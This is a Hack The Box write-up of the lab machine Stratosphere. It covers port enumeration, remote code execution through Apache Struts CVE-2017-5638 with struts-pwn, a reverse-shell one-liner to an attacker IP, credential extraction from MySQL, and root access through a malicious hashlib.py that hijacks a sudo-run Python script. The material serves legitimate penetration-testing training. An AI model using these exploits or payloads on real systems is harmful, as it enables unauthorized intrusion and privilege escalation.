---
layout: post
title:  "Stratosphere Writeup - Hack The Box"
date:   2023-12-22
desc: "Apache Struts CVE-2017-5638 Exploitation, Python Library Hijacking"
keywords: "HTB,eJPT,eWPT,Linux,ApacheStruts,PythonLibraryHijacking,Medium"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,ApacheStruts,PythonLibraryHijacking,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I'm going with another **Linux** machine, **Stratosphere**, from [Hack The Box](https://www.hackthebox.com/){:target="_blank"}, which is categorized as average by the community, I think because of the initial listing and the research time one must do to be able to find resources to exploit a vulnerability in the machine. I do not know what hurts me more, if the overload of information that you often get on a **Windows** machine, by the number of ports and services or when you only have to deal with a single open port. It is also very good when you have to create a script to automate tasks or use one of the community and get to understand what is being done, a little reverse engineering. I'm going after a new lab.

<br/><br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere.jpg" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

As usual, I use **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** to deploy the machine, check the connectivity and take advantage of the **TTL** to recognize the Operating System. With `nmap` I perform the first commands to get the exposed ports, services and versions. Thanks to the report obtained with `nmap`, the help of some search engine and **Launchpad**, I can find out the **Codename** of the box, **Buster**.

```bash
./htbExplorer -d Stratosphere
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.64 -oG allPorts
nmap -sCV -p22,80,8080 10.10.10.64 -oN targeted

cat targeted
# duckduckgo.com --> OpenSSH 7.9p1 10+deb10u3 launchpad
# Buster
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I filter for those **HTTP** services, to then use `whatweb` to find out what technologies are being used in the web server, I can't find much at the moment. Accessing from the web, both ports show me the same content, and the source code does not leake me anything important. The page has some functionalities in development phase.

```bash
cat targeted | grep http
whatweb http://10.10.10.64 http://10.10.10.64:8080
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use `wfuzz` to find directories and files in the web service, I find two files, the first one takes me to an authentication panel and the second one to a web page where it doesn't seem to have much functionality in production. For the first one, I don't have any credentials but for the second one, when accessing it, it redirects me to an `.action` file, a strange extension. And **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** informs me that it is developed with **Java**.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.64/FUZZ
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search in any search engine for **"welcome.action java what is it"**, I find a resource **[How can I set the welcome page to a struts action?](https://stackoverflow.com/questions/1369591/action-extension-what-is-it){:target="_blank"}**, so I know it is implementing with **Struts** and if I search for any vulnerability in this framework I find a very interesting article, **[Exploiting Apache Struts2 CVE-2017-5638 - Lucideus Research](https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede){:target="_blank"}** where a **RCE** is explained. I can check with `nmap` if the web service is vulnerable, and it is. Now just by searching for **".action exploit github"** I find a **[struts-pwn](https://github.com/mazen160/struts-pwn){:target="_blank"}** repository from **Github**, I download it and I can also check with this exploit if it is vulnerable and I use some basic commands to check the **RCE**.

> **Apache Struts** is a free, open-source, MVC framework for creating elegant, modern Java web applications. It favors convention over configuration, is extensible using a plugin architecture, and ships with plugins to support REST, AJAX and JSON.

```bash
nmap -p8080 --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ 10.10.10.64

wget https://raw.githubusercontent.com/mazen160/struts-pwn/master/struts-pwn.py
python struts-pwn.py
python struts-pwn.py -h

python struts-pwn.py -u 10.10.10.64 --check
python struts-pwn.py -u 10.10.10.64/Monitoring/example/Welcome.action --check

python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Login_input.action -c "whoami"
python struts-pwn.py -u 10.10.10.64/Monitoring/example/Welcome.action -c 'id'
python struts-pwn.py -u 10.10.10.64/Monitoring/example/Welcome.action -c 'which curl'
python struts-pwn.py -u 10.10.10.64/Monitoring/example/Welcome.action -c 'which nc'
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I keep enumerating, I can verify that the **RCE** is running on the actual victim machine and not in a container, but if I try to get a **Reverse Shell** I am unsuccessful.

```bash
python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Login_input.action -c "cat /proc/net/fib_trie"
python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Login_input.action -c "cat /proc/net/fib_trie | grep \"host LOCAL\" -B 1"

python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Login_input.action -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

As I can't get a **Reverse Shell**, I keep using the exploit to enumerate more the system, but to avoid running it again and again, we created with the **[Hack4u](https://hack4u.io/){:target="_blank"}** community, a simple script to automate the **RCE**. I find a very interesting `db_connect` file, and when I open it I find some credentials, I try to connect by **SSH** with some users that I find in the `passwd` file that have a `bash` as terminal, but I cannot.

```bash
python struts-pwn.py -u 10.10.10.64/Monitoring/example/Welcome.action -c 'ls -l' | grep Prematurely -A 100 | grep -vE 'Note|Done'
nvim rce.sh
chmod +x rce.sh
./rce.sh
```

> **rce.sh**

```bash
#!/bin/bash

while [ "$command" != "exit" ]; do
  echo -n "$~ " && read command
  python struts-pwn.py -u http://10.10.10.64/Monitoring/example/Login_input.action -c """$command""" | grep "Prematurely" -A 100 | grep -v -E "Note:|Done"
done
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

However, if I use `mysql` to try to list the databases, I can connect with the credentials I found. I search the databases, then by tables and lastly those columns that I think may have relevant information. I find the credentials of the user **richard**. I can also have the same results with `mysqlshow`. I manage to connect successfully by **SSH**, I only must make a console treatment to have a better performance of my activities in the victim machine.

```bash
mysql -uadmin -padmin -e "show databases"
mysql -uadmin -padmin -e "use users; show tables"
mysql -uadmin -padmin -e "use users; describe accounts"
mysql -uadmin -padmin -e "use users; select password, username from accounts"

mysqlshow -uadmin -padmin
mysqlshow -uadmin -padmin users
mysqlshow -uadmin -padmin users accounts
mysqldump -uadmin --password=admin --no-data users
mysqldump -uadmin --password=admin --single-transaction --all-data
```

> **Victime Machine**

```bash
script /dev/null -c bash      [Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I can read the contents of the first unprivileged user flag and run the first basic recognition commands of the **Linux** machine, I also find the **Codename**, which matches what I found with **Launchpad**, **Buster**. Among all, I found with `sudo -l`, a script written in `python` that the user can run as the `root` user, this may prove to be a possible attack vector. I run it to test its purpose but it only shows a MD5 HASH. With **[Crackstation](https://crackstation.net/){:target="_blank"}** I get its value, but it doesn't seem to be important at the moment.

```bash
whoami
id
groups
hostname
hostname -i
uname -a
lsb_release -a
sudo -l               # --> /usr/bin/python* /home/richard/test.py

ls -la /home/richard/test.py
cat $!

/usr/bin/python /home/richard/test.py
```

> **Attacker Machine**:

```bash
echo 5af003e100c80923ec04d65933d382cb | wc -c
echo 5af003e100c80923ec04d65933d382cb | tr -d '\n' | wc -c
hashid 5af003e100c80923ec04d65933d382cb
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Analyzing the script `test.py`, I notice that it is using the `hashlib` library, and I know that `python` looks in the current directory for the libraries it needs to run any script. This is how it is configured by default in its **path**, I can try a **[Library Hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation){:target="_blank"}**. I just create a malicious `hashlib` file, which will grant **SUID** permissions to the `bash`, and then run `test.py` as the `root` user and I can root the box.

```bash
cat test.py
python -c 'import sys;sys.path'
nano hashlib.py
```

> **hashlib.py**:

```python
import os

os.system('chmod u+s /bin/bash')
```

```bash
ls -l /bin/bash
/usr/bin/python /home/richard/test.py
sudo /usr/bin/python /home/richard/test.py
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

There are many ways to use `python` to escalate privileges, another example of a malicious file is to use the `subprocess` library and spawn me a shell directly.

```bash
nano hashlib.py
```

> **hashlib.py**:

```python
import subprocess

result = subprocess.run(['bash'])

result.stdout
```

```bash
sudo /usr/bin/python /home/richard/test.py
```

<br/>
<img src="{{ site.img_path }}/stratosphere_writeup/Stratosphere_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

> It was a challenge to find the first attack vector, it is not very complicated, but often I don't have that experience or I haven't yet developed the instinct that a pentester should have when it comes to finding possible misconfigurations, bugs or other things. **Hack The Box** helps me a lot to grow step by step, I kill the box with `htbExplorer` and I keep looking for new challenges for my way to be a better professional.

```bash
./htbExplorer -k Stratosphere
```
